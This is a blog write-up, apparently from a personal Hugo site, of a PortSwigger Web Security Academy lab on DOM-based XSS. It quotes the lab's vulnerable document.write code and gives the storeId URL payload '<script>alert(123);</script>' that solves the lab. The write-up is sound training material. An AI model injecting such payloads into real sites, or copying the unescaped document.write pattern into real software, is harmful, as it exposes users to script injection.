<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
  Lab: DOM XSS in document.write sink using source location.search inside a select element
  #


  tags: Portswigger Web Security Academy Web
  #


Description: This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.
Goal: To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function.


  Recon
  #


Find the injection place
I used string search to find location.search in each sub-page source.
Here is the interesting code:
:::spoiler Source Code
...
<script>
    var stores = [&#34;London&#34;,&#34;Paris&#34;,&#34;Milan&#34;];
    var store = (new URLSearchParams(window.location.search)).get('storeId');
    document.write('<select name=&#34;storeId&#34;>');
    if(store) {
        document.write('<option selected>'+store+'</option>');
    }
    for(var i=0;i<stores.length;i++) {
        if(stores[i] === store) {
            continue;
        }
        document.write('<option>'+stores[i]+'</option>');
    }
    document.write('</select>');
</script>
...
:::
Try type something about storeID as URL GET parameter
Payload: /product?productId=1&amp;storeId=abc

You can see that this is a perfect injection place


  Exp
  #

Payload: /product?productId=1&amp;storeId=<script>alert(123);</script>
:::spoiler Success Screenshot

:::"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xss/lab_-dom-xss-in-document.write-sink-using-source-location.search-inside-a-select-element/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element"><meta property="og:description" content="Lab: DOM XSS in document.write sink using source location.search inside a select element # tags: Portswigger Web Security Academy Web # Description: This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element. Goal: To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function. Recon # Find the injection place I used string search to find location.search in each sub-page source. Here is the interesting code: :::spoiler Source Code ... <script> var stores = [&#34;London&#34;,&#34;Paris&#34;,&#34;Milan&#34;]; var store = (new URLSearchParams(window.location.search)).get('storeId'); document.write('<select name=&#34;storeId&#34;>'); if(store) { document.write('<option selected>'+store+'</option>'); } for(var i=0;i<stores.length;i++) { if(stores[i] === store) { continue; } document.write('<option>'+stores[i]+'</option>'); } document.write('</select>'); </script> ... ::: Try type something about storeID as URL GET parameter Payload: /product?productId=1&amp;storeId=abc You can see that this is a perfect injection place Exp # Payload: /product?productId=1&amp;storeId=<script>alert(123);</script> :::spoiler Success Screenshot :::"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="Portswigger Web Security Academy"><meta property="article:tag" content="Web"><title>Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xss/lab_-dom-xss-in-document.write-sink-using-source-location.search-inside-a-select-element/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#recon>Recon</a></li><li><a href=#exp>Exp</a></li><li><a href=#reference>Reference</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=lab-dom-xss-in-documentwrite-sink-using-source-locationsearch-inside-a-select-element>Lab: DOM XSS in <code>document.write</code> sink using source <code>location.search</code> inside a select element
<a class=anchor href=#lab-dom-xss-in-documentwrite-sink-using-source-locationsearch-inside-a-select-element>#</a></h1><h6 id=tags-portswigger-web-security-academy-web>tags: <code>Portswigger Web Security Academy</code> <code>Web</code>
<a class=anchor href=#tags-portswigger-web-security-academy-web>#</a></h6><ul><li>Description: This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript <code>document.write</code> function, which writes data out to the page. The <code>document.write</code> function is called with data from <code>location.search</code> which you can control using the website URL. The data is enclosed within a select element.</li><li>Goal: To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the <code>alert</code> function.</li></ul><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><ol><li>Find the injection place
I used string search to find <code>location.search</code> in each sub-page source.
Here is the interesting code:
:::spoiler Source Code<pre tabindex=0><code class=language-javascript! data-lang=javascript!>...
&lt;script&gt;
    var stores = [&#34;London&#34;,&#34;Paris&#34;,&#34;Milan&#34;];
    var store = (new URLSearchParams(window.location.search)).get(&#39;storeId&#39;);
    document.write(&#39;&lt;select name=&#34;storeId&#34;&gt;&#39;);
    if(store) {
        document.write(&#39;&lt;option selected&gt;&#39;+store+&#39;&lt;/option&gt;&#39;);
    }
    for(var i=0;i&lt;stores.length;i++) {
        if(stores[i] === store) {
            continue;
        }
        document.write(&#39;&lt;option&gt;&#39;+stores[i]+&#39;&lt;/option&gt;&#39;);
    }
    document.write(&#39;&lt;/select&gt;&#39;);
&lt;/script&gt;
...
</code></pre>:::</li><li>Try type something about <code>storeID</code> as URL GET parameter
Payload: <code>/product?productId=1&amp;storeId=abc</code>
<img src=https://i.imgur.com/KKbTF8f.png alt>
You can see that this is a perfect injection place</li></ol><h2 id=exp>Exp
<a class=anchor href=#exp>#</a></h2><p>Payload: <code>/product?productId=1&amp;storeId=&lt;script>alert(123);&lt;/script></code>
:::spoiler Success Screenshot
<img src=https://i.imgur.com/bjEoUzh.png alt>
:::</p><h2 id=reference>Reference
<a class=anchor href=#reference>#</a></h2></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#recon>Recon</a></li><li><a href=#exp>Exp</a></li><li><a href=#reference>Reference</a></li></ul></nav></div></aside></main></body></html>